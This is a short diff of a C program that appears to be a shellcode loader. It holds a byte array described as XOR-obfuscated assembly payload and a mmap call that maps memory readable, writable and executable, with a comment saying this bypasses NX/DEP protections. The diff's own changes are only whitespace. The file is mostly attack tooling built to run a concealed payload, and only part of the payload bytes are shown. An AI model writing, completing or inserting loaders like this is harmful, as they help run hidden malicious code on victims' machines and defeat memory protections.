@@ -7,7 +7,7 @@
 int main() {
     // 1. Raw assembly instructions + payload data, entirely obfuscated.
     // Every single byte is XOR-encoded with 0xAA. No raw \x00 bytes present.
-    unsigned char payload[] = 
+    unsigned char payload[] =
         "\x62\xec\x25\xaa\xaa\xaa\xaa\xc2\xcc\xc7\xde\xc2\xcc\xc4\xdf"
         "\xc2\xcc\xc5\xdc\xe2\xc2\xd2\x25\x21\x21\xaa\xaa\xeb\x9a\xf4"
         "\xe1\xee\xa8\x1e\xe1\xee\x6b\xaa\xe3\xd6\xe2\xda\x22\xba\x31"
@@ -26,9 +26,8 @@ int main() {
 
     // 3. Allocate a memory page aligned specifically for execution permissions
     // This bypasses NX/DEP protections that would cause stack corruption errors.
-    void *exec_mem = mmap(NULL, payload_len, PROT_READ | PROT_WRITE | PROT_EXEC,
-                          MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-    
+    void* exec_mem = mmap(NULL, payload_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+
     if (exec_mem == MAP_FAILED) {
         return 1;
     }
